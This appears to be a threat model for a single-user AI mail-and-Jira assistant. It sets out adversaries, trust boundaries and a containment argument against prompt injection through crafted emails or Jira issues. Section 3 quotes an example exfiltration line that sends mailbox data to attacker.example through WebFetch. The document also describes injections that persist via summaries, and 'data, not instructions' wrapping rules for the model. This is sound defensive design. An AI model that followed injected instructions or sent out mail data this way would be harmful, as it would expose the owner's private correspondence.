# Gojo — Threat Model

**Owns (§18):** assets, trust boundaries, adversary assumptions, the
control-to-threat mapping and its evidence pointers.
**Never contains:** build sequence, operational commands, decision
reasoning (those live in ADRs — linked below).

A control without a test is a claim. Every control in the mapping table
points at the test or recorded measurement that shows it holding; where
evidence is still pending it says so, visibly.

---

## 1. Scope and adversary assumptions

One user, one tenant, one box (GOJO-MASTER.md §1.3). The adversaries this
document plans for:

- **A1 — anyone who can email the owner.** Cheapest attack there is. From
  step 4, mail content enters the gather agent's context, so every sender
  on the internet can put text in front of the model.
- **A2 — anyone who can write to Jira issues the owner can read.** Same
  channel, smaller population (tenant colleagues, integration bots).
- **A3 — a holder of a leaked credential** (client secret, Jira token,
  `.env`, the box itself).
- **A4 — a tenant user who installs the Teams app.** Valid JWTs, wrong
  person.

Not in scope: a compromised Anthropic or Microsoft, kernel-level
compromise of the VPS, and multi-user isolation (there is no second user).

## 2. Assets

| Asset | Where it lives | Notes |
|---|---|---|
| Owner's mailbox content | Microsoft 365; excerpts transit the agent and LangSmith (EU, signed off §9.2) | The crown jewels — and also the injection vector |
| Colleagues' mailboxes | Microsoft 365 | Gojo must never be able to read these — see B5 |
| Jira project data | Atlassian cloud | Read-only exposure |
| Claude subscription credentials | `ccuser`'s home directory | Serve both the build environment and Gojo (§18 A/B boundary) |
| Teams/Graph client secret | `.env`, mode 0600 | One app registration serves both surfaces: a leak of `TEAMS_CLIENT_SECRET` is *also* mailbox access, RBAC-scoped to the owner (B5) |
| Jira API token | `.env` | Delegated: blast radius = the owner's own Jira permissions, revocable at id.atlassian.com |
| Conversation state | `checkpoints/gojo.sqlite` + backups | Carries distilled mail content; 0600, gitignored, on-box |
| The `.env` file itself | repo root, 0600, gitignored | ADR 0003's wall |

## 3. Trust boundaries

- **B1 — Internet → Caddy → app.** TLS termination, then Bot Framework JWT
  validation (single-tenant issuers from `TENANTID`, ADR 0006) and the
  allow-list of one Entra object id. JWT proves the request came through
  Azure Bot Service; the allow-list is what makes Gojo single-user in fact
  (defeats A4).
- **B2 — app → Agent SDK subprocess.** `setting_sources=[]`: no CLAUDE.md,
  no host settings, no slash commands leak in from the build environment.
- **B3 — agent → tools.** Three layers, all wired in `runner.py`:
  `allowed_tools` names exactly the gather pair; `strict_mcp_config=True`
  blocks filesystem MCP config; and the subprocess's **built-in tools
  (Bash, Read/Write/Edit, WebFetch, WebSearch...) are present but
  explicitly denied** via `disallowed_tools` — deny-by-default is the SDK's
  behaviour, this is our configuration. WebFetch is the one that matters:
  it would be a working exfiltration channel for an injected email
  (`fetch https://attacker.example/?q=<mailbox data>`).
- **B4 — tools → upstream APIs.** Per-connector credentials; upstream
  tokens never appear in tool output (§8.5); connectors are SDK-free and
  return reduced, capped fields only.
- **B5 — app-only Graph token → mailboxes.** Exchange RBAC scopes
  `Application Mail.Read` to the owner's mailbox via a management scope
  filter; nothing is granted in Entra, because Entra and RBAC grants union
  and an unscoped Entra grant would silently void the scoping (§8.4). The
  proof is the negative test: `Test-ServicePrincipalAuthorization` against
  a colleague's mailbox must return `InScope: False`.
- **B6 — fetched content → model.** The adversarial boundary (A1/A2).
  Everything a connector returns is wrapped in `<external-data>` markers
  (closing tag stripped from payloads) under a static "data, not
  instructions" preamble, and Megumi's system prompt carries the matching
  rule. `/compact` summaries — distilled from transcripts that contained
  that content — re-enter under the same wrapper, and summarisation runs
  tool-free.

## 4. The containment argument (prompt injection via mail)

Assume A1 succeeds completely: a crafted email fully steers Megumi.
**The worst available outcome today is a misleading answer to the owner**,
because:

1. Megumi's process denies every write-capable and network-capable
   built-in tool (B3) — steering the agent acquires no Bash, no file
   access, no WebFetch.
2. Its only tools are the two read-only fetchers; tool acquisition beyond
   them is blocked twice (allow-list + strict MCP config).
3. Output goes to exactly one place: the owner, in Teams (B1). There is no
   cross-user surface to pivot to.
4. Write capability does not exist anywhere in the system until step 5,
   and arrives only behind `interrupt()` — with its own re-argued version
   of this section as a precondition.

## 5. Residual risks — stated, not hidden

- **Delimiters are mitigation, not proof.** B6's wrapper raises the bar;
  no wrapper is a guarantee against instruction-following. The argument
  above deliberately does not depend on it holding.
- **A poisoned answer can social-engineer the owner.** "Megumi says Dave
  urgently needs the invoice paid" is an attack on the human, and no
  control here touches it. Awareness is the mitigation.
- **`/compact` carries distilled untrusted content forward** across
  sessions, wrapped but present. An injection that survives summarisation
  persists into the next session's context.
- **The mailbox preview cap (~255 chars/message) limits, not eliminates,**
  what an attacker can stage per message.
- **LangSmith (EU) holds prompt and mail excerpts** — accepted and signed
  off in §9.2; listed because it is real exposure, not because it is
  unmitigated.

## 6. Control mapping

| Threat | Control | Where | Evidence |
|---|---|---|---|
| A4: valid-JWT wrong-user | Allow-list of one object id | `teams.py` | `test_teams_authorisation.py` |
| A1/A2: injected instructions | B6 wrapping + tool-free `/compact` + system-prompt rule | `agents/tools.py`, `agents/megumi.py`, `commands.py` | `test_tools.py` (wrapping, tag-strip), `test_megumi.py`, `test_commands.py` |
| A1: injection → action | Built-ins denied; allow-list; strict MCP config | `agents/runner.py` | `test_runner_options.py`; live probe ("run `ls`" → refusal) — **pending, build-log Session 5** |
| A1: injection → exfiltration | WebFetch/WebSearch in the denial list; only egress is the answer to the owner | `agents/runner.py` | `test_runner_options.py` |
| A3: leaked app secret reads colleagues' mail | Exchange RBAC scope, no Entra grant | `infra/graph-mail-rbac.ps1` | build-log Session 5 §3: owner `InScope: True`, real colleague `InScope: False`, recorded verbatim 7 Aug 2026 |
| A3: leaked Jira token | Delegated token, owner-revocable, read-only usage | `libs/connectors/jira` | Token scope is Atlassian-side; revocation runbook in VPS.md |
| Secrets at rest | `.env` 0600, gitignored, never logged; SecretStr | ADR 0003, `config.py` | `test_config.py` (repr leak test) |
| Billing hijack via env var | `ANTHROPIC_API_KEY` rejected at startup | `config.py` | `test_config.py` guard tests |
| Config bleed from build env | `setting_sources=[]` + `strict_mcp_config` | `agents/runner.py` | `test_runner_options.py` |
| Poisoned dependency chain (checkpointer CVEs) | Version floors pinned in lockfile | `pyproject.toml`, §6.1 | CI `pip-audit`; pins listed §6.1 |
| Content accumulating in journald | Log lines carry counts/ids/shapes, never content | `agents/tools.py` | `test_tools.py` handlers + code review |
| Runaway agent (§9.3 #1) | Wall clock + recursion limit + per-turn agent budget | `orchestrator.py` | `test_guards.py` |

## 7. Review triggers

Re-argue §4 **before** any of: granting `Mail.Send` or any write scope
(step 5), adding a connector that returns third-party content, widening
the allow-list beyond one user, or removing any entry from
`DISALLOWED_BUILTIN_TOOLS`. Step 5's ADR must cite this section.

## Related
- ADR 0010 — the tool mechanism these boundaries wrap.
- GOJO-MASTER.md §8.4 — the RBAC mitigation this model's B5 depends on.
- ADR 0003 — secrets wall.
